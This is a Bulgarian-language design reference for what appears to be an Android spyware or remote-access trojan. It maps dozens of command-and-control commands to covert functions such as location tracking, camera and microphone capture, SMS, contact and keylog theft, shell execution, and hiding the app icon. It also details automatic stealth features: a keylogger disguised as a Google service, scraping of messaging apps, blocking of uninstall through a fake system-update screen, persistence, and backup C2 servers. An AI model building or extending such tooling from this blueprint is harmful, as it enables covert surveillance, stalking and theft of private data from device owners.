# Android Features & Commands Mapping

Всяка feature (функция) на Android клиента и точната команда, която я активира от сървъра.

---

## 📡 Command-Triggered Features (активират се с команда от сървъра)

| # | Feature | Command (от сървъра) | Параметри | Описание |
|---|---------|---------------------|-----------|----------|
| 1 | GPS Локация (еднократна) | `get_location` | — | Взема текущите GPS координати |
| 2 | GPS Tracking (продължително) | `start_location_tracking` | `interval_ms` (default: 60000) | Стартира постоянно проследяване на локацията |
| 3 | Спиране GPS Tracking | `stop_location_tracking` | — | Спира проследяването |
| 4 | Камера стрийм старт | `start_camera` | `camera_id` ("0"=задна, "1"=предна) | Стартира видео стрийм от камерата |
| 5 | Камера стрийм стоп | `stop_camera` | — | Спира камера стрийма |
| 6 | Снимка | `take_photo` | `camera_id` ("0"/"1") | Прави снимка и я праща base64 |
| 7 | Скрийншот | `take_screenshot` | — | Прави screencap на екрана |
| 8 | Запис на екрана старт | `start_screen_record` | `duration` (default: 30 сек) | Стартира запис на екрана |
| 9 | Запис на екрана стоп | `stop_screen_record` | — | Спира записа и праща video_base64 |
| 10 | Аудио запис старт | `start_audio` | `compress` (bool), `max_duration_sec` (default: 60) | Стартира запис на аудио |
| 11 | Аудио запис стоп | `stop_audio` | — | Спира аудио записа |
| 12 | Ambient запис | `ambient_record` | `duration` (default: 60 сек) | Записва околен звук чрез микрофон |
| 13 | Live Video стрийм старт | `start_live_video` | `camera_id` ("0"/"1") | WebRTC live видео стрийм |
| 14 | Live Video стрийм стоп | `stop_live_video` | — | Спира live видео стрийма |
| 15 | Live Audio стрийм старт | `start_live_audio` | — | WebRTC live аудио стрийм |
| 16 | Live Audio стрийм стоп | `stop_live_audio` | — | Спира live аудио стрийма |
| 17 | SMS четене | `get_sms` | — | Взема последните 100 SMS от inbox |
| 18 | SMS изпращане | `send_sms` | `phone_number`, `message` | Изпраща SMS от устройството |
| 19 | Контакти | `get_contacts` | — | Взема списъка с контакти + телефони |
| 20 | История на обаждания | `get_call_logs` | — | Взема последните 100 обаждания |
| 21 | Инфо за устройството | `get_device_info` | — | Модел, версия, батерия, root статус |
| 22 | Инсталирани приложения | `get_installed_apps` | — | Списък на всички инсталирани apps |
| 23 | Shell команда (sh) | `shell_command` | `command` | Изпълнява sh -c команда |
| 24 | Shell exec (sh) | `shell_exec` | `command` | Изпълнява sh -c команда (алтернативен handler) |
| 25 | Keylog dump | `get_keylog_dump` | — | Взема буфера с клавиши от accessibility |
| 26 | Keylog ACK | `keylog_ack` | `success` (bool), `backup_key` | Потвърждава получаване на keylog dump |
| 27 | Toggle WiFi | `toggle_wifi` | — | Отваря WiFi settings (Android 10+) |
| 28 | WiFi информация | `get_wifi_info` | — | SSID, BSSID, IP, signal, MAC |
| 29 | Google акаунти | `get_accounts` | — | Списък на Google/други акаунти |
| 30 | Промяна аудио режим | `change_audio_mode` | `mode` ("normal"/"silent"/"vibrate") | Сменя звуков режим на телефона |
| 31 | Инсталиране APK | `install_apk` | `apk_base64` | Инсталира APK от base64 данни |
| 32 | Деинсталиране app | `uninstall_app` | `package_name` | Деинсталира приложение |
| 33 | Стартиране app | `launch_app` | `package_name` | Стартира приложение по package name |
| 34 | Отключване екран | `unlock_screen` | — | Събужда екрана (wake lock) |
| 35 | Скриване иконка | `hide_icon` | — | Скрива launcher иконката на приложението |
| 36 | Показване иконка | `show_icon` | — | Показва launcher иконката обратно |
| 37 | Преглед файлове | `browse_files` | `path` (default: /sdcard), `recursive` (bool) | Листва файлове в директория |
| 38 | Листване файлове | `list_files` | `path`, `recursive` | Листва файлове (алтернативен handler) |
| 39 | Изтегляне файл | `download_file` | `path` | Изтегля файл от устройството |
| 40 | Качване файл | `upload_file` | (file data в params) | Качва файл на устройството |
| 41 | Качване файл (chunk) | `upload_file_chunk` | (chunk data в params) | Качва файл на части |
| 42 | Изтриване файл | `delete_file` | `path` | Изтрива файл |
| 43 | Преглед файл | `preview_file` | `path`, `max_size` (default: 1MB) | Преглежда съдържанието на файл |
| 44 | Преименуване файл | `rename_file` | `path`, `new_name` | Преименува файл |
| 45 | Преместване файл | `move_file` | `path`, `destination` | Премества файл |
| 46 | Търсене файлове | `search_files` | `query` | Търси файлове по име |
| 47 | Добавяне geofence | `add_geofence` | `latitude`, `longitude`, `radius` (default: 200m), `label` | Създава геозона за мониторинг |
| 48 | Clipboard мониторинг | `start_clipboard_monitor` | — | Стартира мониторинг на clipboard-а |
| 49 | Social media scraping | `social_media_chats` | — | Тригерира ръчно скрапване на чатове |
| 50 | Използване на приложения | `get_app_usage` | — | Събира статистика за ползване на apps (7 дни) |
| 51 | Браузър история | `get_browser_history` | — | Извлича Chrome/browser история и bookmarks |

---

## 🔄 Automatic Features (стартират автоматично, НЕ изискват команда)

| # | Feature | Service/Component | Описание | Trigger |
|---|---------|-------------------|----------|---------|
| A1 | Keylogger | `GoogleHelperService` (Accessibility) | Записва всяко натискане на клавиш от всяко приложение | Автоматично — Accessibility events |
| A2 | Notification capture | `StealthNotificationListener` | Прихваща ВСИЧКИ нотификации (заглавие, текст, снимки, икони) | Автоматично — NotificationListenerService |
| A3 | Call recording | `CallRecordingService` | Записва телефонни разговори (4 стратегии за dual-side capture) | Автоматично — TelephonyManager (OFFHOOK/IDLE) |
| A4 | Clipboard monitoring | `ClipboardMonitorService` | Мониторира промени в clipboard-а | Автоматично — стартира при boot/app launch |
| A5 | Battery monitoring | `BatteryMonitorService` | Следи батерията и адаптира sync интервалите | Автоматично — BroadcastReceiver за батерия |
| A6 | Social media scraping | `GoogleHelperService` + `SocialMediaScraper` | Скрапва чатове от WhatsApp, Viber, Telegram, Messenger, Signal, Instagram, Facebook | Автоматично — когато app е на фокус |
| A7 | Anti-uninstall protection | `GoogleHelperService` | Блокира опити за деинсталиране/деактивиране на приложението | Автоматично — Accessibility мониторинг |
| A8 | Fake system update | `FakeSystemUpdateActivity` | Показва фалшив "System Update" диалог при опит за деактивиране | Автоматично — тригерира се от GoogleHelperService |
| A9 | Accessibility guard | `AccessibilityGuardService` | Блокира достъп до accessibility settings за приложението | Автоматично — мониторира settings |
| A10 | Keep alive / Watchdog | `WatchdogService` + `KeepAliveJobService` | Рестартира CommandService ако бъде убит; проверява на 30 сек | Автоматично — JobScheduler + periodic checks |
| A11 | Boot persistence | `BootReceiver` | Стартира CommandService и WatchdogService при рестарт на устройството | Автоматично — BOOT_COMPLETED broadcast |
| A12 | Data sync | `DataSyncWorker` + `DataSyncManager` | Синхронизира офлайн събрани данни при наличие на мрежа | Автоматично — periodic WorkManager (15 мин) |
| A13 | Offline data queue | `OfflineCollectorWorker` + `OfflineDataQueue` | Събира данни когато няма мрежа и ги queue-ва за изпращане | Автоматично — periodic WorkManager |
| A14 | HTTP polling fallback | `CommandService` (вградено) | Пада на HTTP polling ако WebSocket не работи (5 сек интервал) | Автоматично — след 2 неуспешни WS опита |
| A15 | C2 server failover | `CommandService` (вградено) | Превключва към резервен C2 сървър след 3 неуспешни опита | Автоматично — reconnect logic |

---

## 🔀 Server-Side Commands (в ALLOWED_COMMANDS whitelist, но без handler в Android)

Тези команди са в server whitelist-а, но **нямат** handler в `CommandService.dispatchCommand()`:

| Command | Статус | Бележка |
|---------|--------|--------|
| `get_localtime` | ❌ Няма Android handler | В server whitelist, но не е имплементиран |
| `take_picture` | ❌ Дублира `take_photo` | Стар алиас, не е в Android `when` блока |
| `screen_record` | ❌ Дублира `start_screen_record` | Стар алиас |
| `set_audio_mode` | ❌ Дублира `change_audio_mode` | Стар алиас |
| `get_notifications` | ❌ Няма Android handler | Нотификациите се събират автоматично |
| `start_continuous_location` | ❌ Дублира `start_location_tracking` | Стар алиас |
| `dump_whatsapp_messages` | ❌ Няма Android handler | Скрапването е автоматично + `social_media_chats` |
| `check_root` | ❌ Няма Android handler | Root check е в `get_device_info` |
| `start_webrtc_stream` | ❌ Няма Android handler | Използвай `start_live_video` |
| `ping` | ❌ Няма Android handler | Heartbeat е автоматичен |
| `location` | ❌ Дублира `get_location` | В CommandValidator, не в CommandSender |
| `mic_record` | ❌ Дублира `start_audio` | В CommandValidator |
| `camera_capture` | ❌ Дублира `take_photo` | В CommandValidator |
| `dump_contacts` | ❌ Дублира `get_contacts` | В CommandValidator |
| `dump_sms` | ❌ Дублира `get_sms` | В CommandValidator |
| `dump_calllogs` | ❌ Дублира `get_call_logs` | В CommandValidator |

---

## 📋 Quick Reference: Команда → Feature

```
get_location             → GPS (еднократна)
start_location_tracking  → GPS Tracking (постоянно)
stop_location_tracking   → Спиране GPS Tracking
start_camera             → Камера стрийм
stop_camera              → Спиране камера стрийм
take_photo               → Снимка
take_screenshot          → Скрийншот
start_screen_record      → Запис на екрана
stop_screen_record       → Спиране запис екран
start_audio              → Аудио запис
stop_audio               → Спиране аудио запис
ambient_record           → Околен звук запис
start_live_video         → WebRTC Live Video
stop_live_video          → Спиране Live Video
start_live_audio         → WebRTC Live Audio
stop_live_audio          → Спиране Live Audio
get_sms                  → Четене SMS
send_sms                 → Изпращане SMS
get_contacts             → Контакти
get_call_logs            → История обаждания
get_device_info          → Инфо устройство
get_installed_apps       → Инсталирани apps
shell_command            → Shell команда
shell_exec               → Shell exec (алтернативен)
get_keylog_dump          → Keylog данни
keylog_ack               → Потвърждение keylog
toggle_wifi              → Toggle WiFi
get_wifi_info            → WiFi информация
get_accounts             → Google акаунти
change_audio_mode        → Промяна звуков режим
install_apk              → Инсталиране APK
uninstall_app            → Деинсталиране app
launch_app               → Стартиране app
unlock_screen            → Отключване екран
hide_icon                → Скриване иконка
show_icon                → Показване иконка
browse_files             → Преглед файлове
list_files               → Листване файлове
download_file            → Изтегляне файл
upload_file              → Качване файл
upload_file_chunk        → Качване файл (chunk)
delete_file              → Изтриване файл
preview_file             → Преглед файл
rename_file              → Преименуване файл
move_file                → Преместване файл
search_files             → Търсене файлове
add_geofence             → Добавяне геозона
start_clipboard_monitor  → Clipboard мониторинг
social_media_chats       → Social media scraping
get_app_usage            → App usage статистика
get_browser_history      → Браузър история
```
